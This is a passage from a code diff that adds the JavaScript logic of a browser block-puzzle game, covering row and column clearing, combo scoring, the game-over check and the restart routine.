+            if(!board[r][c]) {
+                full = false;
+                break;
+            }
+        }
+        if(full) {
+            for(let c = 0; c < SIZE; c++) {
+                board[r][c] = null;
+            }
+            cleared++;
+        }
+    }
+
+    // Columns
+    for(let c = 0; c < SIZE; c++) {
+        let full = true;
+        for(let r = 0; r < SIZE; r++) {
+            if(!board[r][c]) {
+                full = false;
+                break;
+            }
+        }
+        if(full) {
+            for(let r = 0; r < SIZE; r++) {
+                board[r][c] = null;
+            }
+            cleared++;
+        }
+    }
+
+    // Score
+    if(cleared > 0) {
+        score += cleared * 10;
+        if(cleared >= 2) {
+            score += cleared * 10;
+            document.getElementById("message").innerText = "🔥 COMBO × " + cleared;
+        }
+    }
+}
+
+/* =====================================================
+   GAME OVER CHECK
+===================================================== */
+
+function hasPossibleMove() {
+    for(const piece of pieces) {
+        if(!piece) continue;
+
+        for(let r = 0; r < SIZE; r++) {
+            for(let c = 0; c < SIZE; c++) {
+                if(canPlace(piece, r, c)) {
+                    return true;
+                }
+            }
+        }
+    }
+    return false;
+}
+
+/* =====================================================
+   SCORE
+===================================================== */
+
+function updateScore() {
+    document.getElementById("score").innerText = score;
+}
+
+/* =====================================================
+   RESTART
+===================================================== */
+
+function restartGame() {
+    const modal = document.getElementById("gameOverModal");
+    const audio = document.getElementById("lostAudio");
+    
+    modal.style.display = "none";
+    if(audio) {
+        audio.pause();
+        audio.currentTime = 0;
+    }
+
+    if(dragging) {
+        const clone = document.getElementById("dragClone");
+        if(clone) clone.remove();
+        dragging = null;
+    }
+
+    clearPreview();
+    document.getElementById("dropArrow").style.display = "none";
+    document.getElementById("message").innerText = "Drag a block onto the board.";
+
+    startGame();
+}
+
+/* =====================================================
+   START
+===================================================== */
+
+startGame();
+
+</script>
 </body>
 </html>
